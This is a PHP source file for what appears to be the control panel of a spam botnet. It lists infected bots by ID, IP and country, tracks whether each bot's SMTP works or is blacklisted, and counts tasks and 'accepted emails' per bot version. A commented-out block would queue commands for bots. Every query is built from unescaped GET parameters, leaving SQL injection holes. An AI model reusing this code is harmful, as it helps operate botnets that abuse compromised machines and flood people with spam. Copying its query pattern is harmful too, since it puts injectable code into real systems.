<?php
  require("passwd.inc");
  require("../cfg.php");

  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");  
  header("Last-Modified: " . gmdate( "D, d M Y H:i:s") . " GMT"); 
  header("Cache-Control: no-cache, must-revalidate"); 
  header("Pragma: no-cache");

  $format = "%Y-%m-%d %H:%M:%S";


function time_to_sec($time) { 
    $hours = substr($time, 0, -6); 
    $minutes = substr($time, -5, 2); 
    $seconds = substr($time, -2); 

    return $hours * 3600 + $minutes * 60 + $seconds; 
}

function sec_to_time($seconds) { 
    $hours = floor($seconds / 3600); 
    $minutes = floor($seconds % 3600 / 60); 
    $seconds = $seconds % 60; 

    return sprintf("%d:%02d:%02d", $hours, $minutes, $seconds); 
} 

?>

<html>
<head>
<title>Bot activity</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?php

  
  $action = $_GET['action'];
  if ($action === "clear") {
    @mysql_query("DELETE FROM BotActivity;");
  }
/*  elseif ($action === "Add command")
  {
    $ver = $_GET['Ver'];
    $command = $_GET['Command'];
    @mysql_query("INSERT INTO BotConfig (Ver, Command) VALUES ('$ver', '$command');");
  
  }
  elseif ($action === "deletecommand")
  {
    $id = $_GET['id'];
    
    @mysql_query("DELETE FROM BotConfig WHERE `Id`='$id';");
  }
*/
  
  echo "<hr>\r\n";
  echo "<div align='center'><h2>Bot activity</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";

  echo "Currently activity logging is ";
  if ($log_activity) {
    echo "<b>ON</b><br>";
  } else {
    echo "<b>OFF</b><br>";
  }

  echo "You can <a href=\"?action=clear\">CLEAR</a> all activities.<br>\r\n";
  echo "<hr><br>";

  echo "<form action=\"BotActivity.php\" method=\"GET\">\r\n";
  echo "Activity for BotId: <input type=text value=\"\" name=\"BotId\"><br>\r\n";
  echo "<input type=submit name=action value=\"Get activity\">\r\n";
  echo "</form>\r\n";

  echo "<hr>\r\n";

  echo "<form action=\"BotActivity.php\" method=\"GET\">\r\n";
  echo "List of Bots ver: <input type=text value=\"\" name=\"BotVer\"><br>\r\n";
  echo "<input type=submit name=action value=\"Get list\">\r\n";
  echo "</form>\r\n";

  echo "<hr>\r\n";

  echo "<form action=\"BotActivity.php\" method=\"GET\">\r\n";
  echo "List of Bots ver: <input type=text value=\"\" name=\"BotVer\"><br>\r\n";
  echo "<input type=submit name=action value=\"Get list from stata2\">\r\n";
  echo "</form>\r\n";

  echo "<hr>\r\n";

  echo "<form action=\"BotActivity.php\" method=\"GET\">\r\n";
  echo "Get ";
  echo "<input type=submit name=action value=\"Versions list\">\r\n";
  echo "</form>\r\n";

  echo "<hr>\r\n";


  if ($action === "Get activity") {
    $BotId = $_GET['BotId'];

    $BotRobo = @mysql_query("SELECT * FROM robo WHERE id='$BotId';");
    $BotIp = mysql_result($BotRobo,$i,'ip');
    $BotGood = mysql_result($BotRobo,$i,'smtp') === "ok";
    $BotBlackListed = mysql_result($BotRobo,$i,'bl') == 1;

    $BotActivity = @mysql_query("SELECT * FROM BotActivity WHERE BotId='$BotId' ORDER BY DateTime;");
    if (mysql_num_rows($BotActivity) < 1)
    {
      echo "<center>No activity available for <b>BotId</b></center>\r\n";
    } else {
      echo "<center>Current activities for bot id <b>$BotId</b>:</center><br>\r\n";
      echo "<center>IP: $BotIp ";

      if ($BotGood)
        echo "<b><font color=green>good</font></b>";
      else
        echo "<b><font color=red>bad</font></b>";

      if ($BotBlackListed)
        echo " <u>black listed</u>";

      //****** determination IPЁ& country - START
      $flag = "0";
      $country = "";
//      $ip = long2ip(ip2long($_POST["ip"]));}
      $resultat = mysql_query("SELECT COUNTRY_CODE2 FROM ip2country WHERE (IP_FROM<=inet_aton('".$BotIp."') AND IP_TO>=inet_aton('".$BotIp."'))");
      if (!($ligne = mysql_fetch_array($resultat)))
      {
        $country="1";
      } else {
        $resultat2 = mysql_query("SELECT printable_name FROM country WHERE iso='".$ligne["COUNTRY_CODE2"]."'");
      	if (!($ligne2 = mysql_fetch_array($resultat2)))
        {
          $country = "2";
        } else {
      	  $flag = strtolower("flags/".$ligne["COUNTRY_CODE2"]).".png";
      	  if (!file_exists($flag))
          {
            $flag="0";
          }
      	  $country=$ligne2["printable_name"];
      	}
      }
      //****** determination IPЁ& country - END
      echo "</center><br>\r\n";
      echo "<center>$country <img src=\"$flag\"></center><br>\r\n";

      echo "<table border='1' align='CENTER'>\r\n<tr><td>Version</td><td>DateTime</td><td>ActivityType</td><td>AdditionalId</td><td>IP</td></tr>\r\n";

      $tasks_finished = 0;
      $total_time_taken = 0;
      $TaskStartTime = 0;
      $accepted_emails = 0;
      for ($i=0; $i < mysql_num_rows($BotActivity); $i++) {
        $Ver = mysql_result($BotActivity,$i,'BotVer');
        $DateTime = mysql_result($BotActivity,$i,'DateTime');
        $ActivityType = mysql_result($BotActivity,$i,'ActivityType');
        $AdditionalId = mysql_result($BotActivity,$i,'AdditionalId');
        $ActivityIp = mysql_result($BotActivity,$i,'IP');
        echo "<tr><td>$Ver</td><td>$DateTime</td><td>";
        if ($ActivityType == 1)
        {
          echo "alive";
        } elseif ($ActivityType == 2) {
          echo "tasks";
          $TaskStartTime = strtotime($DateTime);
          echo "<u>$DateTimeParsed</u>";
        } elseif ($ActivityType == 3) {
          echo "report";
          if ($TaskStartTime != 0) {
            $accepted_emails += $AdditionalId;
            $TaskEndTime = strtotime($DateTime);
            $tasks_finished = $tasks_finished + 1;
            $total_time_taken = $total_time_taken + $TaskEndTime - $TaskStartTime;
            $TaskStartTime = 0;
          }
        } elseif ($ActivityType == 4) {
          echo "config";
        }
        echo "</td>";
        if ($ActivityType == 3)
           echo "<td>$AdditionalId</td>";
        else
           echo "<td></td>";
        echo "<td>$ActivityIp</td></tr>\r\n";
      }
      echo "</table>\r\n";
      if ($tasks_finished > 0) {
        echo "Finished <b>$tasks_finished</b> tasks, average <b>".round($total_time_taken/$tasks_finished)."</b> seconds per task.<br>\r\n";
        echo "Accepted <b>$accepted_emails</b> emails, average <b>".round($accepted_emails/$tasks_finished)."</b> emails per task.<br>\r\n";
      } else {
        echo "Finished <b>0</b> tasks.";
      }
    }
  } elseif ($action === "Get list") {
    $BotVer = $_GET['BotVer'];
    $BotList = @mysql_query("SELECT * FROM BotActivity WHERE BotVer='$BotVer' GROUP BY BotId;");
    if (mysql_num_rows($BotList) < 1)
    {
      echo "<center>No activity available for ver <b>$BotVer</b></center>\r\n";
    } else {
      echo "<center>Current list of bots ver <b>$BotVer</b>:</center><br>\r\n";
      echo "<table border='1' align='CENTER'>\r\n<tr><td>Version</td><td>BotId</td><td>Activity</td></tr>\r\n";
      for ($i=0; $i < mysql_num_rows($BotList); $i++) {
        $BotId = mysql_result($BotList,$i,'BotId');
        echo "<tr><td>$BotVer</td><td>$BotId</td><td><a href=\"?action=Get%20activity&BotId=$BotId\">Get</a></td></tr>\r\n";
      }
      echo "</table>\r\n";
    }
  } elseif ($action === "Get list from stata2") {
    $BotVer = $_GET['BotVer'];
    $BotList = @mysql_query("SELECT * FROM robo WHERE Ver='$BotVer' GROUP BY Id;");
    if (mysql_num_rows($BotList) < 1)
    {
      echo "<center>No activity available for ver <b>$BotVer</b></center>\r\n";
    } else {
      echo "<center>Current list of bots ver <b>$BotVer</b>:</center><br>\r\n";
      echo "<table border='1' align='CENTER'>\r\n<tr><td>Version</td><td>BotId</td><td>Ip</td><td>Country</td><td>Flag</td></tr>\r\n";
      for ($i=0; $i < 1000; $i++)
        $country_count[$i] = 0;
      for ($i=0; $i < mysql_num_rows($BotList); $i++) {
        $BotId = mysql_result($BotList,$i,'id');
        $BotIp = mysql_result($BotList,$i,'ip');
        //****** determination IPЁ& country - START
        $flag = "0";
        $country = "";
//        $ip = long2ip(ip2long($_POST["ip"]));}
        $resultat = mysql_query("SELECT COUNTRY_CODE2 FROM ip2country WHERE (IP_FROM<=inet_aton('".$BotIp."') AND IP_TO>=inet_aton('".$BotIp."'))");
        if (!($ligne = mysql_fetch_array($resultat)))
        {
          $country="1";
        } else {
          $resultat2 = mysql_query("SELECT printable_name FROM country WHERE iso='".$ligne["COUNTRY_CODE2"]."'");
          if (!($ligne2 = mysql_fetch_array($resultat2)))
          {
            $country = "2";
          } else {
            $flag = strtolower("flags/".$ligne["COUNTRY_CODE2"]).".png";
            if (!file_exists($flag))
            {
              $flag="0";
            }
            $country=$ligne2["printable_name"];
            $country_id=$ligne2["numcode"];
            $country_count[$country_id]++;
          }
        }
        //****** determination IPЁ& country - END
        echo "<tr><td>$BotVer</td><td>$BotId</td><td>$BotIp</td><td>$country</td><td><img src=\"$flag\"></td></tr>\r\n";
      }
      echo "</table>\r\n";
      for ($i=0; $i < 1000; $i++)
        echo $country_count[$i]."<br>";
    }
  } elseif ($action === "Versions list") {
    $VerList = @mysql_query("SELECT BotVer FROM BotActivity WHERE BotVer <> '' GROUP BY BotVer;");
    if (mysql_num_rows($VerList) < 1)
    {
      echo "<center>No activity available for this server</center>\r\n";
    } else {
      echo "<center>Available versions:</center><br>\r\n";
      echo "<table border='1' align='CENTER'>\r\n<tr><td>Version</td><td>Count</td><td>Tasks passed</td><td>Accepted emails per task</td></tr>\r\n";
      for ($i=0; $i < mysql_num_rows($VerList); $i++) {
        $BotVer = mysql_result($VerList,$i,'BotVer');


        $BotList = @mysql_query("SELECT * FROM robo WHERE `ver` = '$BotVer';");
        $BotCount = @mysql_num_rows($BotList);

        $VerInfo = @mysql_query("SELECT AdditionalId FROM BotActivity WHERE BotVer=$BotVer AND ActivityType=3;");
        $AcceptedEmails = 0;
        for ($k=0; $k < mysql_num_rows($VerInfo); $k++)	
          $AcceptedEmails += mysql_result($VerInfo,$k,'AdditionalId');
        $TasksTaken = @mysql_num_rows($VerInfo);

        echo "<tr><td>$BotVer</td><td>$BotCount</td><td>$TasksTaken</td><td>";
        if ($TasksTaken > 0)
          echo round($AcceptedEmails/$TasksTaken);
        else
          echo "0";
        echo "</td></tr>\r\n";
      }
      echo "</table>\r\n";
    }
  }
  mysql_close($dbase);
?>

</body>
</html>